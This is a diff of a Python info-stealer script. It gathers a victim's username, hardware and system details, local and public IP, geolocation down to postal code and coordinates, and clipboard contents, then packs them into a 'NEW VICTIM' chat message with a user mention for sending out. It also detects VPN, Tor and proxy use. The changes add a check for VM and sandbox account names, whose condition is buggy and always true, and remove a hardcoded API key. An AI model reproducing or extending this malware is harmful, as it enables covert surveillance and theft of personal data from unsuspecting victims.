@@ -43,14 +43,12 @@ clipboard = pyperclip.paste()
 vpnresult = ''
 
 username = getpass.getuser()
-print("Username:", username)
-if username == 'fredr':
-    print('VM')
-    try:
-       os.remove('.')
-       quit()
-    except:
-       quit()  
+#print("Username:", username)
+username_warn = ''
+if username == 'WDAGUtilityAccount' or 'User' or 'Default' or 'Root' or 'System' or 'Administrator' or 'Guest' or 'DefaultAccount':
+    username_warn = (f'Script is being ran on an account commonly used on VMs') 
+else:
+    username_warn = 'False'
     
     
 
@@ -120,7 +118,11 @@ def get_ip_info_dump():
 
 
 ip_address = requests.get('https://api.ipify.org').text
-Securl = f"https://vpnapi.io/api/{ip_address}?key=f3c961a55691497fb7eb98fa6bdfd111"
+API_Key = ('')
+if API_Key == '':
+    print('Please enter your API key\nGet it on https://vpnapi.io/\n\nLook at line 121\n')
+    quit()
+Securl = f"https://vpnapi.io/api/{ip_address}?key={API_Key}"
 response2 = requests.get(Securl)
 data = response2.json()
     
@@ -151,9 +153,83 @@ def main():
 
     # Send message
     if not (relay_status or proxy_status or tor_status or vpn_status):
-        message = f'----------------------------------**NEW MESSAGE**--------------------------------------------------------\n\n\n<@515402023223427072>\n**NEW VICTIM**\n\n\n\n**Device**\n```\nDevice Info: {pl.uname()}\nDevice IP: {ip_address}\nLocal IP: {local_ip_address}\nSystem language: {language}\nCurrent user: {username}\nAccount Status: {microsoft}\nClipboard: {clipboard}```\n\n**IP Address Dump**\n```\nDevice IP: {ip_info["ip"]}\nCity: {ip_info["city"]}\nRegion: {ip_info["region"]}\nCountry: {ip_info["country"]}\nPostal code: {ip_info["postal"]}\nTimezone: {ip_info["timezone"]}\nOrganization: {ip_info["org"]}\nCoordinates: {ip_info["loc"]}```\n\n**Security Info**\n```\nVPN: {vpn_status}\nProxy: {proxy_status}\nTor: {tor_status}\nRelay: {relay_status}```\n**Hardware Info**```CPU Model: {cpu_model}\nCPU Count: {cpu_count}\nCPU Frequency: {cpu_freq}\nCPU Usage: {cpu_percent}%\nGPU Model: {gpu_model}\nTotal Memory: {mem_total}\nAvailable Memory: {mem_available}\nMemory Usage: {mem_percent}%\nDisk Usage: {disk_usage}```Screenshot: '
+       message = (f'----------------------------------**NEW MESSAGE**--------------------------------------------------------\n\n\n'
+           f'<@515402023223427072>\n'
+           f'**NEW VICTIM**\n\n'
+           f'**Device**\n```'
+           f'Virtual Machine: {username_warn}\n'
+           f'Device Info: {pl.uname()}\n'
+           f'Device IP: {ip_address}\n'
+           f'Local IP: {local_ip_address}\n'
+           f'System language: {language}\n'
+           f'Current user: {username}\n'
+           f'Account Status: {microsoft}```\n'
+           f'**Clipboard**\n```Clipboard: {clipboard}```\n\n'
+           f'**IP Address Dump**\n```'
+           f'Device IP: {ip_info["ip"]}\n'
+           f'City: {ip_info["city"]}\n'
+           f'Region: {ip_info["region"]}\n'
+           f'Country: {ip_info["country"]}\n'
+           f'Postal code: {ip_info["postal"]}\n'
+           f'Timezone: {ip_info["timezone"]}\n'
+           f'Organization: {ip_info["org"]}\n'
+           f'Coordinates: {ip_info["loc"]}```\n\n'
+           f'**Security Info**\n```'
+           f'VPN: {vpn_status}\n'
+           f'Proxy: {proxy_status}\n'
+           f'Tor: {tor_status}\n'
+           f'Relay: {relay_status}```\n'
+           f'**Hardware Info**```'
+           f'CPU Model: {cpu_model}\n'
+           f'CPU Count: {cpu_count}\n'
+           f'CPU Frequency: {cpu_freq}\n'
+           f'CPU Usage: {cpu_percent}%\n'
+           f'GPU Model: {gpu_model}\n'
+           f'Total Memory: {mem_total}\n'
+           f'Available Memory: {mem_available}\n'
+           f'Memory Usage: {mem_percent}%\n'
+           f'Disk Usage: {disk_usage}```'
+          )
+
     else:
-        message = f'----------------------------------**NEW MESSAGE**--------------------------------------------------------\n\n\n<@515402023223427072>\n**NEW VICTIM**\n\n\n\n**Device**\n```\nDevice Info: {pl.uname()}\nDevice IP: {ip_address}             ⚠️VPN Detected\nLocal IP: {local_ip_address}\nSystem language: {language}\nCurrent user: {username}\nAccount Status: {microsoft}\nClipboard: {clipboard}```\n\n**IP Address Dump**⚠️\n```\nDevice IP: {ip_info["ip"]}             ⚠️VPN Detected\nCity: {ip_info["city"]}             ⚠️VPN Detected\nRegion: {ip_info["region"]}             ⚠️VPN Detected\nCountry: {ip_info["country"]}             ⚠️VPN Detected\nPostal code: {ip_info["postal"]}             ⚠️VPN Detected\nTimezone: {ip_info["timezone"]}             ⚠️VPN Detected\nOrganization: {ip_info["org"]}\nCoordinates: {ip_info["loc"]}             ⚠️VPN Detected```\n\n**Security Info**\n```\nVPN: {vpn_status}\nProxy: {proxy_status}\nTor: {tor_status}\nRelay: {relay_status}\n```\n**Hardware Info**```CPU Model: {cpu_model}\nCPU Count: {cpu_count}\nCPU Frequency: {cpu_freq}\nCPU Usage: {cpu_percent}%\nGPU Model: {gpu_model}\nTotal Memory: {mem_total}\nAvailable Memory: {mem_available}\nMemory Usage: {mem_percent}%\nDisk Usage: {disk_usage}```'
+        message = (f'----------------------------------**NEW MESSAGE**--------------------------------------------------------\n\n\n'
+           f'<@515402023223427072>\n'
+           f'**NEW VICTIM**\n\n'
+           f'**Device**\n```'
+           f'Virtual Machine: {username_warn}\n'
+           f'Device Info: {pl.uname()}\n'
+           f'Device IP: {ip_address} ⚠️VPN Detected\n'
+           f'Local IP: {local_ip_address}\n'
+           f'System language: {language}\n'
+           f'Current user: {username}\n'
+           f'Account Status: {microsoft}```\n'
+           f'**Clipboard**\n```Clipboard: {clipboard}```\n\n'
+           f'**IP Address Dump**⚠️\n```'
+           f'Device IP: {ip_info["ip"]} ⚠️VPN Detected\n'
+           f'City: {ip_info["city"]} ⚠️VPN Detected\n'
+           f'Region: {ip_info["region"]} ⚠️VPN Detected\n'
+           f'Country: {ip_info["country"]} ⚠️VPN Detected\n'
+           f'Postal code: {ip_info["postal"]} ⚠️VPN Detected\n'
+           f'Timezone: {ip_info["timezone"]} ⚠️VPN Detected\n'
+           f'Organization: {ip_info["org"]}\n'
+           f'Coordinates: {ip_info["loc"]} ⚠️VPN Detected```\n\n'
+           f'**Security Info**\n```'
+           f'VPN: {vpn_status}\n'
+           f'Proxy: {proxy_status}\n'
+           f'Tor: {tor_status}\n'
+           f'Relay: {relay_status}\n```\n'
+           f'**Hardware Info**```'
+           f'CPU Model: {cpu_model}\n'
+           f'CPU Count: {cpu_count}\n'
+           f'CPU Frequency: {cpu_freq}\n'
+           f'CPU Usage: {cpu_percent}%\n'
+           f'GPU Model: {gpu_model}\n'
+           f'Total Memory: {mem_total}\n'
+           f'Available Memory: {mem_available}\n'
+           f'Memory Usage: {mem_percent}%\n'
+           f'Disk Usage: {disk_usage}```'
+          )
+
 
     message_payload = {'content': message}
     message_headers = {"Content-Type": "application/json"}
@@ -183,6 +259,7 @@ def main():
         print("Error sending message:", e)
         if hasattr(e.response, 'text'):
             print("Error response:", e.response.text)
+        quit()
 
 
 if __name__ == '__main__':
